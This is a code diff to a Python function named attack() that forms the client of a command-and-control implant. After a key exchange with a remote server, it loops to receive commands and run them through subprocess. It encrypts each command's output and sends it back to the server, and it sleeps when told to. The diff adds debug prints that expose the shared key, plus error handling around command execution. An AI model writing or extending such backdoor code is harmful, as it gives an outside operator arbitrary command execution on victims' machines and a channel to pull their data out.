@@ -235,20 +235,27 @@ def attack():
     """
     # always start with key exchanging with the server
     cmd_code, command = key_exchange()
-
+    print("[!] Successfully connect to server!")
+    print("[!] The shared key is:", shared_key)
     while True:
-        print(cmd_code, command)
+        print("[!] got from server:", command)
         if cmd_code == SERVER_COMMANDS['ok&process']:
             # run the command in the shell...
-            output: bytes = subprocess.Popen(command.strip().split(' '), stdout=subprocess.PIPE).communicate()[0]
+            try:
+                output: bytes = subprocess.Popen(command.strip().split(' '), stdout=subprocess.PIPE).communicate()[0]
+            except Exception:
+                output: bytes = b'Error: Unknown command!'
+
+            print("[!] send to server:\n", output.decode())
             enc_msg = build_req(CLIENT_COMMANDS['ok&ans'], output)
             cmd_code, command = send_req_recv_res(enc_msg)  # ... and send the result to the server
 
         elif cmd_code == SERVER_COMMANDS['ok&sleep']:
-            print('good night')
+            print('[!] good night for', command, 'seconds')
             time.sleep(int(command))  # go to sleep
 
             # send a wakeup message
+            print('[!] good an awake msg to server')
             enc_msg = build_req(CLIENT_COMMANDS['awake'], b'awake')
             cmd_code, command = send_req_recv_res(enc_msg)  # ... and send the result to the server
 
